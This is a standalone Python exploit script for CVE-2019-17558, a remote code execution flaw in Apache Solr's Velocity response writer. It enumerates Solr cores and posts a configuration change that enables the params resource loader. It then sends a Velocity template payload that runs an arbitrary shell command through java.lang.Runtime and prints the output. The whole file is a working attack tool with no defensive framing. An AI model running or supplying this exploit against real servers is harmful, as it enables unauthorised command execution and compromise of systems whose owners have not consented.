import requests
import sys
import json
import re

class CVE_2019_17558():
    def __init__(self):
        self.banner()
        self.url = sys.argv[1]
        self.command = sys.argv[2]
        self.check_url()

    def banner(self):
        banners = r'''
          ______     _______     ____   ___  _  ___        _ _____ ____ ____   ___  
         / ___\ \   / / ____|   |___ \ / _ \/ |/ _ \      / |___  | ___| ___| ( _ ) 
        | |    \ \ / /|  _| _____ __) | | | | | (_) |_____| |  / /|___ \___ \ / _ \ 
        | |___  \ V / | |__|_____/ __/| |_| | |\__, |_____| | / /  ___) |__) | (_) |
         \____|  \_/  |_____|   |_____|\___/|_|  /_/      |_|/_/  |____/____/ \___/ 

           Python3 By Forever404
           Usage:python3 cve-2019-17558.py http://192.168.1.2:8983/ whoami
           '''
        print(banners)

    def check_url(self):
        if self.url[-1]!='/':
            self.url += '/'
        if requests.get(self.url).status_code!=200:
            sys.exit("This website is not accessible!!!")

    def get_core_name(self):
        payload = 'solr/admin/cores?indexInfo=false&wt=json'
        res = requests.get(url=self.url + payload)
        if res.status_code == 200 and 'responseHeader' in res.text:
            json_data = json.loads(res.text)
            print("Targets URL:")
            for name in json_data['status']:
                print(self.url+'solr/'+name+'/config')
                if self.open_loader(self.url+'solr/'+name+'/config') and self.check_loader(self.url+'solr/'+name+'/config'):
                    self.exec(self.url+'solr/'+name)
                    break
        else:
            print("core name not found!!")

    def check_loader(self,url):
        res = requests.get(url)
        if 'params.resource.loader.enabled' in res.text:
            key = re.findall(r'"params.resource.loader.enabled":"(.*?)"},',res.text)
            if key and key[0]=='true':
                print("[+]:params.resource.loader.enabled is true!\n")
                return True
            elif key and key[0]=='false':
                print("[-]:params.resource.loader.enabled is false!\n")
        else:
            print("[-]:params.resource.loader.enabled is not found!\n")
            return False

    def open_loader(self,url):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/json',
            'Content-Length': '259',
            'Connection': 'close'
        }
        payloads = """
            {
                "update-queryresponsewriter": {
                    "startup": "lazy",
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "template.base.dir": "",
                    "solr.resource.loader.enabled": "true",
                    "params.resource.loader.enabled": "true"
                }
            }
        """
        res = requests.post(url,headers=headers,data=payloads)
        if res.status_code!=200 or 'responseHeader' not in res.text:
            print("open params.resource.loader.enabled is wrong! because it is ont found!\n")
            return False
        elif res.status_code==200 and 'responseHeader' in res.text:
            return True

    def exec(self,url):
        payload = r"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(self.command)
        res = requests.get(url+payload)
        print("exec response:"+res.text)

if __name__ == '__main__':
    if(len(sys.argv))!=3:
        try:
            CVE_2019_17558()
        except:
            pass
        sys.exit("Missing parameters")
    start = CVE_2019_17558()
    start.get_core_name()